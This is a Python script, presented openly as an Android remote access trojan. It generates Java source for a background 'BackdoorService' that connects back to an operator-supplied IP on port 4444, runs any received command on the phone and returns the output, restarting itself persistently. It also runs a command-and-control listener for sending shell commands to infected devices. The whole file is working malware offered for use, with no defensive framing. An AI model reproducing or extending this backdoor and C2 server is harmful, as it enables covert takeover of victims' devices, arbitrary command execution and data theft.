#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Android RAT - Remote Access Tool
Advanced Android remote access and control
"""

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress
import socket
import threading
import subprocess
import os

console = Console()

class AndroidRAT:
    def __init__(self):
        self.host = "0.0.0.0"
        self.port = 4444
        self.clients = []
        
    def generate_payload(self):
        """Generate Android APK payload"""
        console.print(Panel.fit(
            "[bold red]Android RAT Payload Generator[/bold red]",
            border_style="red"
        ))
        
        payload_code = '''package com.andro.rat;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import java.io.*;
import java.net.*;

public class BackdoorService extends Service {
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(() -> {
            try {
                Socket socket = new Socket("YOUR_IP", 4444);
                InputStream in = socket.getInputStream();
                OutputStream out = socket.getOutputStream();
                
                while (true) {
                    byte[] buffer = new byte[1024];
                    int bytes = in.read(buffer);
                    if (bytes == -1) break;
                    
                    String command = new String(buffer, 0, bytes);
                    Process process = Runtime.getRuntime().exec(command);
                    
                    BufferedReader reader = new BufferedReader(
                        new InputStreamReader(process.getInputStream()));
                    StringBuilder result = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) {
                        result.append(line).append("\\n");
                    }
                    
                    out.write(result.toString().getBytes());
                    out.flush();
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
        
        return START_STICKY;
    }
    
    @Override
    public IBinder onBind(Intent intent) { return null; }
}'''
        
        output_dir = "android_payload"
        os.makedirs(output_dir, exist_ok=True)
        
        with open(os.path.join(output_dir, "BackdoorService.java"), 'w') as f:
            f.write(payload_code)
        
        console.print(f"\n[green]✓ Payload generated in: {output_dir}/[/green]")
        console.print("[yellow]Build APK with Android Studio or command line[/yellow]")
        
        return output_dir
    
    def start_listener(self):
        """Start command and control server"""
        console.print(Panel.fit(
            "[bold cyan]Starting C2 Server...[/bold cyan]",
            border_style="cyan"
        ))
        
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.host, self.port))
        server.listen(5)
        
        console.print(f"[green]✓ Listening on {self.host}:{self.port}[/green]")
        console.print("[yellow]Waiting for Android devices to connect...[/yellow]\n")
        
        try:
            while True:
                client, addr = server.accept()
                self.clients.append((client, addr))
                console.print(f"[green]✓ Device connected: {addr}[/green]")
                
                # Handle client in separate thread
                client_thread = threading.Thread(
                    target=self.handle_client,
                    args=(client, addr)
                )
                client_thread.start()
                
        except KeyboardInterrupt:
            console.print("\n[yellow]Stopping server...[/yellow]")
    
    def handle_client(self, client, addr):
        """Handle client commands"""
        try:
            while True:
                command = input(f"\n[{addr}] $ ")
                
                if command.lower() == 'exit':
                    break
                
                if not command:
                    continue
                
                client.send(command.encode())
                response = client.recv(4096).decode()
                
                console.print(f"[cyan]{response}[/cyan]")
                
        except Exception as e:
            console.print(f"[red]Error: {e}[/red]")
        finally:
            client.close()
    
    def run(self):
        """Main RAT interface"""
        console.print(Panel.fit(
            "[bold red]Android RAT[/bold red]\n"
            "Advanced Remote Access Tool",
            border_style="red"
        ))
        
        choice = input("\n[1] Generate APK Payload\n[2] Start C2 Server\nChoice: ")
        
        if choice == '1':
            self.generate_payload()
        elif choice == '2':
            self.start_listener()

if __name__ == "__main__":
    rat = AndroidRAT()
    rat.run()

